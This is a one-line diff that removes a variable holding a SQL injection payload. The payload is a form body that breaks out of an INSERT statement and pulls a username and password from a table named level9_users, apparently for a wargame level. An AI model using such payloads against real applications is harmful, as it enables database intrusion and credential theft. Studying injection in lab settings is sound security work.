@@ -1,1 +1,0 @@
-payload = "autor=123&title=123&text=123'),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),'6&post=Submit+Query"
